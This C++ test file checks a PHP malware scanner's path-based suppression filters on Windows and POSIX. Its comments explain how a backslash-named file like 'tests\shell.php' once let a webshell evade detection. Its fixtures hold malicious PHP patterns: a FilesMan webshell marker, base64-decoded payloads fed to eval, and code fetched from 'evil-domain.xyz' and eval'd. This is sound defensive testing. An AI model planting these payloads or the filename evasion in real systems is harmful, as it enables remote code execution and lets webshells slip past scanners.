// The path a context filter sees, and what a backslash in it means on each platform.
//
// THE TWO DEFECTS THESE CASES EXIST FOR
// -------------------------------------
// applyContextFilter suppresses a rule by looking for fragments in the file's path:
// `/vendor/` for vendored crypto under OBF003, `/tests/` for fixtures under WS006, and
// ten more. Every fragment is spelled with forward slashes, and a Windows path arrives
// with the separator Windows gave it. So `\vendor\` never contained `/vendor/`, and
// eleven of the twelve fragments could not fire on Windows at all. Measured over the
// same corpus with both platforms' binaries: detection agreed exactly and the benign
// sweep did not - 47 findings on Windows against 44 on Linux, the extra three being
// OBF003 on a vendored PhpSpreadsheet writer and WS006 on two Magento test fixtures.
//
// The first repair rewrote every backslash to a forward slash on every platform, and
// that was a detection evasion on Linux. POSIX permits a backslash inside a file name,
// so a file NAMED `tests\shell.php` - one file, no directory, named by whoever dropped
// it - was rewritten to `tests/shell.php`, the WS006 fixture suppression found `/tests/`
// in it, and a live webshell signature was dropped: the release binary said exit 2 and
// WS006 for that name and the repaired one said exit 0 and nothing, on identical bytes.
//
// THE ASYMMETRY THAT SETTLES IT
// -----------------------------
// Windows forbids a backslash inside a path component, so on Windows a backslash is
// always a separator and rewriting it is exact. POSIX permits one, so on POSIX it is
// sometimes a character in a name, and rewriting it guesses - in the direction that
// grants a suppression. So match() rewrites under _WIN32 only, and on POSIX the filters
// see the path byte for byte. That is a property of the platform's path grammar, not a
// preference, which is why a platform conditional is the right answer here.
//
// WHAT EACH KIND OF CASE CHECKS, AND ON WHICH PLATFORM
// ----------------------------------------------------
//   filterPath() itself, pinned once and thoroughly on every platform: it is a pure
//     function and the layer, and the two rules the measurement named are not the
//     property.
//   Every fragment through the real rule that owns it, in forward-slash spelling and
//     in backslash spelling put through filterPath() first, on every platform: this is
//     the normalisation meeting the filters, and it does not depend on the binding.
//   The Windows binding: a raw backslash path handed to match() is suppressed. Checked
//     where a backslash is a separator; skips elsewhere, saying so.
//   The POSIX contract, and the regression control for the evasion: a raw backslash
//     path handed to match() still FIRES, and a real file on disk whose name contains a
//     backslash is still scanned and still fires - for every fragment, not only
//     `/tests/`. Checked where a backslash is a name character; skips on Windows, where
//     no such file can exist.
//   The other direction on disk: a genuine directory named `tests` or `vendor` still
//     suppresses, on every platform.
//
// Every suppression has a control path that must still fire, because a normalisation
// that suppressed everything would satisfy a one-sided case.

#include <gtest/gtest.h>

#include "config/Config.h"
#include "core/MatchEngine.h"
#include "core/Scanner.h"

#include <algorithm>
#include <cstdint>
#include <filesystem>
#include <fstream>
#include <optional>
#include <random>
#include <string>
#include <string_view>
#include <vector>

using namespace lyxbosa;

namespace {

namespace fs = std::filesystem;

// The two platform contracts, each stated once so no case can quietly ask a weaker
// question than its neighbours. A case about the Windows binding skips on POSIX with
// the first; a case about a literal backslash in a name skips on Windows with the second.
std::optional<std::string> whyBackslashIsNotASeparatorHere() {
#ifdef _WIN32
    return std::nullopt;
#else
    return "a backslash is a character in a name on this platform and match() does not "
           "rewrite it; the Windows binding is what the Windows job checks";
#endif
}

std::optional<std::string> whyNoNameCanHoldABackslashHere() {
#ifdef _WIN32
    return "Windows forbids a backslash inside a path component, so no file whose name "
           "contains one can exist to be scanned; a backslash here is always a separator";
#else
    return std::nullopt;
#endif
}

// The other spelling of a forward-slash path, so every table row states one spelling
// and the case derives the other rather than a hand-written pair drifting apart.
std::string backslashed(std::string_view path) {
    std::string out(path);
    std::replace(out.begin(), out.end(), '/', '\\');
    return out;
}

// Rule fixtures. Each one matches its rule's pattern and trips none of that rule's
// content-based filters, so the path is the only thing deciding the outcome.

// OBF003: 30 hex digits, and not the rsaEncryption OID the filter always lets through.
constexpr std::string_view kPackHex =
    "<?php\n$bin = pack('H*', '48656c6c6f20576f726c6421486921');\n";

// WS006: the signature and nothing else - the repro's file, byte for byte.
constexpr std::string_view kFilesMan = "<?php\n$auth = \"FilesMan\";\necho $auth;\n";

// OBF002: four chained chr() calls whose values are not an ascending run.
constexpr std::string_view kChrChain =
    "<?php\n$f = chr(112) . chr(104) . chr(112) . chr(95) . chr(117);\n";

// OBF010 / OBF011: decoded straight into eval, with no json_decode or htmlentities in
// reach.
constexpr std::string_view kGzuncompressEval =
    "<?php\n$d = gzuncompress(base64_decode($x));\neval($d);\n";
constexpr std::string_view kRawurldecodeEval =
    "<?php\n$p = rawurldecode(base64_decode($_POST['d']));\neval($p);\n";

// BD013: a private-key marker with key data on the next line, not inside a comment.
constexpr std::string_view kPrivateKey =
    "<?php\n$key = '-----BEGIN RSA PRIVATE KEY-----\n"
    "MIIEpAIBAAKCAQEA0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789\n"
    "-----END RSA PRIVATE KEY-----';\n";

// DRP001: a remote fetch with eval more than 500 bytes away, which is where the vendor
// path skip applies; in reach of the fetch the rule keeps the match whatever the path.
std::string remoteFetchThenDistantEval() {
    std::string s = "<?php\n$code = file_get_contents('https://evil-domain.xyz/p.txt');\n";
    s += std::string(600, ' ');
    s += "\neval($code);\n";
    return s;
}

// OBF036: 800 bytes of uniform pseudo-random content ahead of PHP source - the shape of
// an encrypted stage, and the same generator tests/rules_test.cpp uses for the rule.
std::string blobThenPhp() {
    std::string s;
    uint32_t state = 0x1d0f461cu;
    for (int i = 0; i < 800; ++i) {
        state = state * 1664525u + 1013904223u;
        s.push_back(static_cast<char>((state >> 16) & 0xFF));
    }
    s += "<?php goto vSHrlRg; $x = 1; ?>";
    return s;
}

class PathFilterFixture : public ::testing::Test {
protected:
    MatchEngine engine;

    void SetUp() override { engine.loadAllBuiltinRules(); }

    bool fires(std::string_view rule, std::string_view content, std::string_view path) {
        for (const auto& m : engine.match(content, path)) {
            if (m.category == rule) return true;
        }
        return false;
    }
};

// A real file on disk, read through Scanner::scanFile the way `check` does, so a case
// about a NAME is a case about a name the platform actually stored.
class OnDiskFixture : public PathFilterFixture {
protected:
    fs::path root;

    void SetUp() override {
        PathFilterFixture::SetUp();
        root = fs::temp_directory_path() /
               ("lyxbosa-path-filter-" + std::to_string(std::random_device{}()));
        fs::create_directories(root);
    }
    void TearDown() override {
        std::error_code ec;
        fs::remove_all(root, ec);
    }

    // `relative` is appended as the platform parses it: on POSIX a string with
    // backslashes in it is one file name, on Windows it is directories.
    bool firesOnDisk(std::string_view rule, std::string_view content, std::string_view relative) {
        const fs::path file = root / std::string(relative);
        fs::create_directories(file.parent_path());
        {
            std::ofstream out(file, std::ios::binary | std::ios::trunc);
            EXPECT_TRUE(out.good()) << "could not write " << file;
            out.write(content.data(), static_cast<std::streamsize>(content.size()));
        }

        AppConfig config = Config::loadFromString(Config::generateDefault());
        config.archives.enabled = false;
        config.actions.quarantine.enabled = false;
        Scanner scanner(config);

        const FileResult result = scanner.scanFile(file);
        EXPECT_FALSE(result.skipped()) << file << " was not read";
        for (const auto& m : result.matches) {
            if (m.category == rule) return true;
        }
        return false;
    }
};

}  // namespace

// ===========================================================================
// The normalisation itself - a pure function, the same on every platform
// ===========================================================================

TEST(FilterPathTest, AForwardSlashPathIsReturnedAsItIs) {
    EXPECT_EQ(MatchEngine::filterPath("wp-content/plugins/foo/vendor/lib.php"),
              "wp-content/plugins/foo/vendor/lib.php");
}

TEST(FilterPathTest, EveryBackslashBecomesAForwardSlash) {
    EXPECT_EQ(MatchEngine::filterPath("C:\\sites\\shop\\vendor\\phpoffice\\Xlsx.php"),
              "C:/sites/shop/vendor/phpoffice/Xlsx.php");
}

// The operator can type either separator and the walk spells the rest the way the
// platform does, so one path can carry both. Nothing may assume one form throughout.
TEST(FilterPathTest, AMixedPathIsNormalisedThroughout) {
    EXPECT_EQ(MatchEngine::filterPath("C:\\sites\\shop/wp-content/plugins\\foo\\vendor/lib.php"),
              "C:/sites/shop/wp-content/plugins/foo/vendor/lib.php");
    EXPECT_EQ(MatchEngine::filterPath("wp-content/plugins\\foo/vendor\\lib.php"),
              "wp-content/plugins/foo/vendor/lib.php");
}

// A UNC root and an extended-length prefix are text like any other: the fragments
// still find what they look for after them, and nothing tries to be clever.
TEST(FilterPathTest, RootPrefixesAreSpelledLikeTheRest) {
    EXPECT_EQ(MatchEngine::filterPath("\\\\server\\share\\www\\vendor\\lib.php"),
              "//server/share/www/vendor/lib.php");
    EXPECT_EQ(MatchEngine::filterPath("\\\\?\\C:\\www\\vendor\\lib.php"),
              "//?/C:/www/vendor/lib.php");
}

// The separator is the only byte touched. UTF-8 is safe by construction - 0x5C cannot
// occur inside a multi-byte sequence - and the case says so with every other byte value.
TEST(FilterPathTest, NoOtherByteIsTouched) {
    EXPECT_EQ(MatchEngine::filterPath(""), "");
    EXPECT_EQ(MatchEngine::filterPath("wp-content/uploads/Καλώς/ήρθατε.php"),
              "wp-content/uploads/Καλώς/ήρθατε.php");

    std::string everyOtherByte;
    for (int b = 1; b < 256; ++b) {
        if (b != '\\') everyOtherByte.push_back(static_cast<char>(b));
    }
    EXPECT_EQ(MatchEngine::filterPath(everyOtherByte), everyOtherByte);
}

// ===========================================================================
// The two Windows findings and the one Linux evasion, by shape
// ===========================================================================

class PathSuppressionTest : public PathFilterFixture {};

// Any platform: once a path is in filter spelling, the vendored writer is suppressed
// under either original spelling and a mixed one.
TEST_F(PathSuppressionTest, OBF003_AVendoredWriterIsSuppressedOnceInFilterSpelling) {
    const std::string forward =
        "wp-content/plugins/shop/vendor/phpoffice/phpspreadsheet/src/PhpSpreadsheet/Writer/Xlsx.php";
    EXPECT_FALSE(fires("OBF003", kPackHex, forward));
    EXPECT_FALSE(fires("OBF003", kPackHex, MatchEngine::filterPath(backslashed(forward))));
    EXPECT_FALSE(fires("OBF003", kPackHex, MatchEngine::filterPath(
                           "C:\\sites\\shop/wp-content/plugins\\shop\\vendor/phpoffice/Xlsx.php")))
        << "a root typed one way and walked the other";
}

// Windows: the raw path reaches the filters normalised, so the 47th finding is gone.
TEST_F(PathSuppressionTest, OBF003_OnWindowsTheRawBackslashPathIsSuppressedByTheBinding) {
    if (const auto why = whyBackslashIsNotASeparatorHere()) GTEST_SKIP() << *why;
    EXPECT_FALSE(fires("OBF003", kPackHex,
                       "C:\\sites\\shop\\wp-content\\plugins\\shop\\vendor\\phpoffice\\Xlsx.php"))
        << "the 47th finding on Windows: \\vendor\\ never contained /vendor/";
}

// POSIX: the same string is one file name, and a name grants nothing.
TEST_F(PathSuppressionTest, OBF003_OnPosixAFileNamedWithBackslashesIsNotVendored) {
    if (const auto why = whyNoNameCanHoldABackslashHere()) GTEST_SKIP() << *why;
    EXPECT_TRUE(fires("OBF003", kPackHex, "wp-content\\plugins\\shop\\vendor\\phpoffice\\Xlsx.php"))
        << "a file NAMED with \\vendor\\ in it is not under vendor/";
}

// Any platform: outside a vendor tree it fires under every spelling, normalised or raw.
TEST_F(PathSuppressionTest, OBF003_StillFiresOutsideAVendorTreeHoweverThePathIsSpelled) {
    const std::string forward = "wp-content/uploads/2026/09/cache.php";
    EXPECT_TRUE(fires("OBF003", kPackHex, forward));
    EXPECT_TRUE(fires("OBF003", kPackHex, MatchEngine::filterPath(backslashed(forward))));
    EXPECT_TRUE(fires("OBF003", kPackHex, backslashed(forward)));
}

TEST_F(PathSuppressionTest, WS006_ATestFixtureIsSuppressedOnceInFilterSpelling) {
    const std::string forward =
        "dev/tests/integration/testsuite/Magento/Backend/_files/filesman_fixture.php";
    EXPECT_FALSE(fires("WS006", kFilesMan, forward));
    EXPECT_FALSE(fires("WS006", kFilesMan, MatchEngine::filterPath(backslashed(forward))));
    EXPECT_FALSE(fires("WS006", kFilesMan, MatchEngine::filterPath(
                           "C:\\sites\\shop/dev/tests\\integration\\testsuite/fixture.php")));
}

TEST_F(PathSuppressionTest, WS006_OnWindowsTheRawBackslashPathIsSuppressedByTheBinding) {
    if (const auto why = whyBackslashIsNotASeparatorHere()) GTEST_SKIP() << *why;
    EXPECT_FALSE(fires("WS006", kFilesMan,
                       "C:\\sites\\shop\\dev\\tests\\integration\\testsuite\\fixture.php"))
        << "the Magento fixtures on Windows: \\tests\\ never contained /tests/";
}

// THE EVASION, by shape: the repro's second file. One name in an uploads directory,
// chosen by whoever dropped the shell. It must fire.
TEST_F(PathSuppressionTest, WS006_OnPosixAFileNamedTestsBackslashShellIsStillAWebshell) {
    if (const auto why = whyNoNameCanHoldABackslashHere()) GTEST_SKIP() << *why;
    EXPECT_TRUE(fires("WS006", kFilesMan, "wp-content/uploads/tests\\shell.php"))
        << "a file NAMED tests\\shell.php is not a fixture under tests/";
    EXPECT_TRUE(fires("WS006", kFilesMan, "tests\\shell.php"));
}

TEST_F(PathSuppressionTest, WS006_StillFiresOutsideATestTreeHoweverThePathIsSpelled) {
    const std::string forward = "wp-content/uploads/shell.php";
    EXPECT_TRUE(fires("WS006", kFilesMan, forward));
    EXPECT_TRUE(fires("WS006", kFilesMan, MatchEngine::filterPath(backslashed(forward))));
    EXPECT_TRUE(fires("WS006", kFilesMan, backslashed(forward)));
}

// ===========================================================================
// Every fragment, through the rule that owns it
// ===========================================================================
//
// One row per rule: the content that fires it, every forward-slash path that must
// suppress it, and one path that must not. The cases derive the backslash spelling of
// each. Fragments with no separator in them (`testdata`, BD005's `vendor-prefixed`)
// are not here - a separator is what these cases are about; the twelve that carry one
// all are.

namespace {

struct FragmentCase {
    const char* rule;
    std::string content;
    std::vector<const char*> suppressed;
    const char* control;
};

std::ostream& operator<<(std::ostream& os, const FragmentCase& c) { return os << c.rule; }

const std::vector<FragmentCase> kFragmentCases = {
    {"OBF003", std::string(kPackHex),
     {"wp-content/plugins/foo/vendor/lib/x.php",                    // /vendor/
      "wp-content/plugins/google-site-kit/third-party/lib/x.php",   // third-party/
      "wp-content/plugins/foo/third_party/lib/x.php",               // third_party/
      "wp-content/plugins/wpforms/vendor-prefixed/lib/x.php",       // vendor-prefixed/
      "wp-content/plugins/foo/lib/crypt/x.php"},                    // /crypt/
     "wp-content/uploads/x.php"},
    {"OBF002", std::string(kChrChain),
     {"wp-content/plugins/foo/vendor/doctrine/inflector/x.php",     // /vendor/
      "src/tests/x.php",                                            // /tests/
      "src/test/x.php"},                                            // /test/
     "wp-content/uploads/x.php"},
    {"OBF010", std::string(kGzuncompressEval),
     {"wp-content/plugins/foo/vendor/lib/x.php",                    // vendor/
      "wp-content/plugins/foo/vendor-prefixed/lib/x.php"},          // vendor-prefixed/
     "wp-content/uploads/x.php"},
    {"OBF011", std::string(kRawurldecodeEval),
     {"wp-content/plugins/foo/vendor/lib/x.php",                    // vendor/
      "wp-content/plugins/foo/vendor-prefixed/lib/x.php"},          // vendor-prefixed/
     "wp-content/uploads/cache.php"},
    {"DRP001", remoteFetchThenDistantEval(),
     {"wp-content/plugins/foo/vendor/lib/x.php",                    // vendor/
      "wp-content/plugins/foo/vendor-prefixed/lib/x.php"},          // vendor-prefixed/
     "wp-content/uploads/loader.php"},
    {"WS006", std::string(kFilesMan),
     {"dev/tests/integration/x.php",                                // /tests/
      "app/code/Magento/Foo/test/x.php"},                           // /test/
     "wp-content/uploads/shell.php"},
    {"BD013", std::string(kPrivateKey),
     {"src/tests/keys/private.php",                                 // /tests/
      "src/test/keys/private.php",                                  // /test/
      "src/fixtures/private.php",                                   // /fixtures/
      "src/fixture/private.php",                                    // /fixture/
      "home/deploy/.ssh/id_rsa"},                                   // /.ssh/
     "wp-content/uploads/c2.php"},
    {"OBF036", blobThenPhp(),
     {"wp-content/wflogs/rules.php"},                               // /wflogs/
     "wp-content/uploads/stage.php"},
};

}  // namespace

class EveryPathFragmentTest : public PathFilterFixture,
                              public ::testing::WithParamInterface<FragmentCase> {};

// Any platform. The forward spelling is the contract the filters always had; the
// backslash spelling put through filterPath() first is the normalisation meeting them,
// checked without the binding being live.
TEST_P(EveryPathFragmentTest, SuppressesInFilterSpellingAndTheControlFires) {
    const FragmentCase& c = GetParam();

    for (const char* path : c.suppressed) {
        EXPECT_FALSE(fires(c.rule, c.content, path))
            << c.rule << " should be suppressed under " << path;
        EXPECT_FALSE(fires(c.rule, c.content, MatchEngine::filterPath(backslashed(path))))
            << c.rule << " should be suppressed under filterPath(" << backslashed(path) << ")";
    }

    EXPECT_TRUE(fires(c.rule, c.content, c.control))
        << c.rule << " must still fire under " << c.control;
    EXPECT_TRUE(fires(c.rule, c.content, MatchEngine::filterPath(backslashed(c.control))))
        << c.rule << " must still fire under filterPath(" << backslashed(c.control) << ")"
        << " - a normalisation that suppressed everything would pass the rest of this case";
}

// Windows only: a raw backslash path handed to match() is what the walk hands it, and
// the binding must normalise it before the filters run.
TEST_P(EveryPathFragmentTest, OnWindowsARawBackslashPathIsSuppressedByTheBinding) {
    if (const auto why = whyBackslashIsNotASeparatorHere()) GTEST_SKIP() << *why;
    const FragmentCase& c = GetParam();

    for (const char* path : c.suppressed) {
        EXPECT_FALSE(fires(c.rule, c.content, backslashed(path)))
            << c.rule << " should be suppressed under " << backslashed(path);
    }
    EXPECT_TRUE(fires(c.rule, c.content, backslashed(c.control)))
        << c.rule << " must still fire under " << backslashed(c.control);
}

// POSIX only: the same string is one file name, and match() must not rewrite it. Every
// fragment, because every one of them became claimable by a name when the rewrite was
// unconditional - not only /tests/.
TEST_P(EveryPathFragmentTest, OnPosixARawBackslashPathIsOneNameAndGrantsNothing) {
    if (const auto why = whyNoNameCanHoldABackslashHere()) GTEST_SKIP() << *why;
    const FragmentCase& c = GetParam();

    for (const char* path : c.suppressed) {
        EXPECT_TRUE(fires(c.rule, c.content, backslashed(path)))
            << c.rule << " was suppressed for a file NAMED " << backslashed(path)
            << " - a backslash in a name is not a separator on this platform";
    }
    EXPECT_TRUE(fires(c.rule, c.content, backslashed(c.control)));
}

class EveryPathFragmentOnDiskTest : public OnDiskFixture,
                                    public ::testing::WithParamInterface<FragmentCase> {};

// THE REGRESSION CONTROL. POSIX only: a real file whose NAME contains backslashes, read
// through the scanner the way `check` reads it, still fires the rule it should. This is
// the case that would have caught the evasion: with the rewrite unconditional, every
// row here fails.
TEST_P(EveryPathFragmentOnDiskTest, OnPosixAFileNamedWithBackslashesIsStillScannedAndFires) {
    if (const auto why = whyNoNameCanHoldABackslashHere()) GTEST_SKIP() << *why;
    const FragmentCase& c = GetParam();

    for (const char* path : c.suppressed) {
        EXPECT_TRUE(firesOnDisk(c.rule, c.content, backslashed(path)))
            << c.rule << " was not reported for a file named " << backslashed(path);
    }
    EXPECT_TRUE(firesOnDisk(c.rule, c.content, backslashed(c.control)));
}

// The other direction, any platform: a genuine directory named tests, vendor, .ssh or
// wflogs still suppresses on disk, and the control beside it still fires.
TEST_P(EveryPathFragmentOnDiskTest, AGenuineDirectoryStillSuppressesOnDisk) {
    const FragmentCase& c = GetParam();

    for (const char* path : c.suppressed) {
        EXPECT_FALSE(firesOnDisk(c.rule, c.content, path))
            << c.rule << " should be suppressed under a real " << path;
    }
    EXPECT_TRUE(firesOnDisk(c.rule, c.content, c.control))
        << c.rule << " must still fire under a real " << c.control;
}

INSTANTIATE_TEST_SUITE_P(Fragments, EveryPathFragmentTest, ::testing::ValuesIn(kFragmentCases),
                         [](const ::testing::TestParamInfo<FragmentCase>& info) {
                             return std::string(info.param.rule);
                         });
INSTANTIATE_TEST_SUITE_P(Fragments, EveryPathFragmentOnDiskTest,
                         ::testing::ValuesIn(kFragmentCases),
                         [](const ::testing::TestParamInfo<FragmentCase>& info) {
                             return std::string(info.param.rule);
                         });
